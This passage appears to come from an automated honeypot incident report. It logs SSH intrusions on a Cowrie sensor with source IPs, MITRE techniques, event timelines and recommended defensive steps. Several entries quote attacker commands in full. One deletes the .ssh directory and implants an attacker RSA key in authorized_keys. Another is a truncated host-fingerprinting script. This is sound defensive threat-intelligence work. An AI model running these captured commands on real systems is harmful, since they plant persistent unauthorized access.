| `2026-09-09 16:45:36` | `cowrie.log.closed` |
| `2026-09-09 16:45:53` | `cowrie.session.params` |
| `2026-09-09 16:45:53` | `cowrie.command.input` |
| `2026-09-09 16:45:54` | `cowrie.log.closed` |
| `2026-09-09 16:45:55` | `cowrie.session.params` |
| `2026-09-09 16:45:55` | `cowrie.command.input` |
| `2026-09-09 16:45:55` | `cowrie.log.closed` |
| `2026-09-09 16:45:56` | `cowrie.session.params` |
| `2026-09-09 16:45:56` | `cowrie.command.input` |
| `2026-09-09 16:45:58` | `cowrie.session.file_download` |
| `2026-09-09 16:45:58` | `cowrie.log.closed` |
| `2026-09-09 16:45:59` | `cowrie.session.params` |
| `2026-09-09 16:45:59` | `cowrie.command.input` |
| `2026-09-09 16:45:59` | `cowrie.log.closed` |
| `2026-09-09 16:46:00` | `cowrie.session.params` |
| `2026-09-09 16:46:00` | `cowrie.command.input` |
| `2026-09-09 16:46:01` | `cowrie.log.closed` |
| `2026-09-09 16:46:01` | `cowrie.session.params` |
| `2026-09-09 16:46:01` | `cowrie.command.input` |
| `2026-09-09 16:46:01` | `cowrie.command.input` |
| `2026-09-09 16:46:02` | `cowrie.log.closed` |
| `2026-09-09 16:46:04` | `cowrie.session.params` |
| `2026-09-09 16:46:04` | `cowrie.command.input` |
| `2026-09-09 16:46:04` | `cowrie.log.closed` |
| `2026-09-09 16:46:05` | `cowrie.session.params` |
| `2026-09-09 16:46:05` | `cowrie.command.input` |
| `2026-09-09 16:46:06` | `cowrie.log.closed` |
| `2026-09-09 16:46:07` | `cowrie.session.params` |
| `2026-09-09 16:46:07` | `cowrie.command.input` |
| `2026-09-09 16:46:07` | `cowrie.log.closed` |
| `2026-09-09 16:46:08` | `cowrie.session.params` |
| `2026-09-09 16:46:08` | `cowrie.command.input` |
| `2026-09-09 16:46:10` | `cowrie.log.closed` |
| `2026-09-09 16:46:11` | `cowrie.session.params` |
| `2026-09-09 16:46:11` | `cowrie.command.input` |
| `2026-09-09 16:46:11` | `cowrie.log.closed` |
| `2026-09-09 16:46:13` | `cowrie.session.params` |
| `2026-09-09 16:46:13` | `cowrie.command.input` |
| `2026-09-09 16:46:13` | `cowrie.log.closed` |
| `2026-09-09 16:46:14` | `cowrie.session.params` |
| `2026-09-09 16:46:14` | `cowrie.command.input` |
| `2026-09-09 16:46:15` | `cowrie.log.closed` |
| `2026-09-09 16:46:16` | `cowrie.session.params` |
| `2026-09-09 16:46:16` | `cowrie.command.input` |
| `2026-09-09 16:46:16` | `cowrie.log.closed` |
| `2026-09-09 16:46:17` | `cowrie.session.params` |
| `2026-09-09 16:46:17` | `cowrie.command.input` |
| `2026-09-09 16:46:18` | `cowrie.log.closed` |
| `2026-09-09 16:46:19` | `cowrie.session.params` |
| `2026-09-09 16:46:19` | `cowrie.command.input` |
| `2026-09-09 16:46:19` | `cowrie.log.closed` |
| `2026-09-09 16:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491f160ae2ae

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:47 |
| **Last Seen** | 2026-09-09 16:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:47:19` | `cowrie.session.connect` |
| `2026-09-09 16:47:19` | `cowrie.client.version` |
| `2026-09-09 16:47:20` | `cowrie.client.kex` |
| `2026-09-09 16:47:21` | `cowrie.login.success` |
| `2026-09-09 16:47:22` | `cowrie.session.params` |
| `2026-09-09 16:47:22` | `cowrie.command.input` |
| `2026-09-09 16:47:22` | `cowrie.command.failed` |
| `2026-09-09 16:47:23` | `cowrie.log.closed` |
| `2026-09-09 16:47:24` | `cowrie.session.params` |
| `2026-09-09 16:47:24` | `cowrie.command.input` |
| `2026-09-09 16:47:25` | `cowrie.session.file_download` |
| `2026-09-09 16:47:25` | `cowrie.log.closed` |
| `2026-09-09 16:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f88dd47e709

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:47 |
| **Last Seen** | 2026-09-09 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:47:25` | `cowrie.session.connect` |
| `2026-09-09 16:47:25` | `cowrie.client.version` |
| `2026-09-09 16:47:25` | `cowrie.client.kex` |
| `2026-09-09 16:47:26` | `cowrie.login.success` |
| `2026-09-09 16:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03adc9a286b

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:47 |
| **Last Seen** | 2026-09-09 16:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:47:27` | `cowrie.session.connect` |
| `2026-09-09 16:47:27` | `cowrie.client.version` |
| `2026-09-09 16:47:27` | `cowrie.client.kex` |
| `2026-09-09 16:47:30` | `cowrie.login.success` |
| `2026-09-09 16:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e025fa47122

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:48 |
| **Last Seen** | 2026-09-09 16:48 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:48:04` | `cowrie.session.connect` |
| `2026-09-09 16:48:04` | `cowrie.client.version` |
| `2026-09-09 16:48:05` | `cowrie.client.kex` |
| `2026-09-09 16:48:06` | `cowrie.login.success` |
| `2026-09-09 16:48:08` | `cowrie.session.params` |
| `2026-09-09 16:48:08` | `cowrie.command.input` |
| `2026-09-09 16:48:08` | `cowrie.command.failed` |
| `2026-09-09 16:48:09` | `cowrie.log.closed` |
| `2026-09-09 16:48:10` | `cowrie.session.params` |
| `2026-09-09 16:48:10` | `cowrie.command.input` |
| `2026-09-09 16:48:10` | `cowrie.session.file_download` |
| `2026-09-09 16:48:10` | `cowrie.log.closed` |
| `2026-09-09 16:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18012effdfe4

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:48 |
| **Last Seen** | 2026-09-09 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:48:19` | `cowrie.session.connect` |
| `2026-09-09 16:48:19` | `cowrie.client.version` |
| `2026-09-09 16:48:20` | `cowrie.client.kex` |
| `2026-09-09 16:48:21` | `cowrie.login.success` |
| `2026-09-09 16:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4fefa39b15

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-09 16:48 |
| **Last Seen** | 2026-09-09 16:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:48:35` | `cowrie.session.connect` |
| `2026-09-09 16:48:35` | `cowrie.client.version` |
| `2026-09-09 16:48:36` | `cowrie.client.kex` |
| `2026-09-09 16:48:36` | `cowrie.login.success` |
| `2026-09-09 16:48:36` | `cowrie.direct-tcpip.request` |
| `2026-09-09 16:48:36` | `cowrie.direct-tcpip.data` |
| `2026-09-09 16:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e89694fb1171

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 16:48 |
| **Last Seen** | 2026-09-09 16:49 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:48:50` | `cowrie.session.connect` |
| `2026-09-09 16:48:52` | `cowrie.client.version` |
| `2026-09-09 16:48:52` | `cowrie.client.kex` |
| `2026-09-09 16:48:59` | `cowrie.login.success` |
| `2026-09-09 16:49:03` | `cowrie.session.params` |
| `2026-09-09 16:49:03` | `cowrie.command.input` |
| `2026-09-09 16:49:05` | `cowrie.log.closed` |
| `2026-09-09 16:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aaafd76731f

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:50 |
| **Last Seen** | 2026-09-09 16:51 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:50:47` | `cowrie.session.connect` |
| `2026-09-09 16:50:47` | `cowrie.client.version` |
| `2026-09-09 16:50:47` | `cowrie.client.kex` |
| `2026-09-09 16:50:48` | `cowrie.login.success` |
| `2026-09-09 16:50:50` | `cowrie.session.params` |
| `2026-09-09 16:50:50` | `cowrie.command.input` |
| `2026-09-09 16:50:50` | `cowrie.command.failed` |
| `2026-09-09 16:50:51` | `cowrie.log.closed` |
| `2026-09-09 16:50:52` | `cowrie.session.params` |
| `2026-09-09 16:50:52` | `cowrie.command.input` |
| `2026-09-09 16:50:52` | `cowrie.session.file_download` |
| `2026-09-09 16:50:52` | `cowrie.log.closed` |
| `2026-09-09 16:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ed2cef2f10

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:50 |
| **Last Seen** | 2026-09-09 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:50:52` | `cowrie.session.connect` |
| `2026-09-09 16:50:52` | `cowrie.client.version` |
| `2026-09-09 16:50:52` | `cowrie.client.kex` |
| `2026-09-09 16:50:54` | `cowrie.login.success` |
| `2026-09-09 16:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af14c93e61d4

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:51 |
| **Last Seen** | 2026-09-09 16:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:51:24` | `cowrie.session.connect` |
| `2026-09-09 16:51:24` | `cowrie.client.version` |
| `2026-09-09 16:51:24` | `cowrie.client.kex` |
| `2026-09-09 16:51:25` | `cowrie.login.success` |
| `2026-09-09 16:51:27` | `cowrie.session.params` |
| `2026-09-09 16:51:27` | `cowrie.command.input` |
| `2026-09-09 16:51:27` | `cowrie.command.failed` |
| `2026-09-09 16:51:28` | `cowrie.log.closed` |
| `2026-09-09 16:51:28` | `cowrie.session.params` |
| `2026-09-09 16:51:28` | `cowrie.command.input` |
| `2026-09-09 16:51:29` | `cowrie.session.file_download` |
| `2026-09-09 16:51:29` | `cowrie.log.closed` |
| `2026-09-09 16:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad156d939a4

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:51 |
| **Last Seen** | 2026-09-09 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:51:29` | `cowrie.session.connect` |
| `2026-09-09 16:51:29` | `cowrie.client.version` |
| `2026-09-09 16:51:29` | `cowrie.client.kex` |
| `2026-09-09 16:51:30` | `cowrie.login.success` |
| `2026-09-09 16:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12c3935aa6e

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:51 |
| **Last Seen** | 2026-09-09 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:51:31` | `cowrie.session.connect` |
| `2026-09-09 16:51:31` | `cowrie.client.version` |
| `2026-09-09 16:51:32` | `cowrie.client.kex` |
| `2026-09-09 16:51:33` | `cowrie.login.success` |
| `2026-09-09 16:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0c5172ffd2

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:51 |
| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:51:57` | `cowrie.session.connect` |
| `2026-09-09 16:51:57` | `cowrie.client.version` |
| `2026-09-09 16:51:57` | `cowrie.client.kex` |
| `2026-09-09 16:51:59` | `cowrie.login.success` |
| `2026-09-09 16:52:00` | `cowrie.session.params` |
| `2026-09-09 16:52:00` | `cowrie.command.input` |
| `2026-09-09 16:52:00` | `cowrie.command.failed` |
| `2026-09-09 16:52:00` | `cowrie.log.closed` |
| `2026-09-09 16:52:03` | `cowrie.session.params` |
| `2026-09-09 16:52:03` | `cowrie.command.input` |
| `2026-09-09 16:52:04` | `cowrie.session.file_download` |
| `2026-09-09 16:52:04` | `cowrie.log.closed` |
| `2026-09-09 16:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe759dae3072

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:52 |
| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:52:11` | `cowrie.session.connect` |
| `2026-09-09 16:52:11` | `cowrie.client.version` |
| `2026-09-09 16:52:12` | `cowrie.client.kex` |
| `2026-09-09 16:52:13` | `cowrie.login.success` |
| `2026-09-09 16:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-594af7d188e2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 16:52 |
| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:52:17` | `cowrie.session.connect` |
| `2026-09-09 16:52:20` | `cowrie.client.version` |
| `2026-09-09 16:52:20` | `cowrie.client.kex` |
| `2026-09-09 16:52:28` | `cowrie.login.success` |
| `2026-09-09 16:52:33` | `cowrie.session.params` |
| `2026-09-09 16:52:33` | `cowrie.command.input` |
| `2026-09-09 16:52:36` | `cowrie.log.closed` |
| `2026-09-09 16:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d74d410513

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:52 |
| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:52:30` | `cowrie.session.connect` |
| `2026-09-09 16:52:33` | `cowrie.client.version` |
| `2026-09-09 16:52:33` | `cowrie.client.kex` |
| `2026-09-09 16:52:34` | `cowrie.login.success` |
| `2026-09-09 16:52:35` | `cowrie.session.params` |
| `2026-09-09 16:52:35` | `cowrie.command.input` |
| `2026-09-09 16:52:35` | `cowrie.command.failed` |
| `2026-09-09 16:52:37` | `cowrie.log.closed` |
| `2026-09-09 16:52:37` | `cowrie.session.params` |
| `2026-09-09 16:52:37` | `cowrie.command.input` |
| `2026-09-09 16:52:38` | `cowrie.session.file_download` |
| `2026-09-09 16:52:38` | `cowrie.log.closed` |
| `2026-09-09 16:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70610d334384

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:52 |
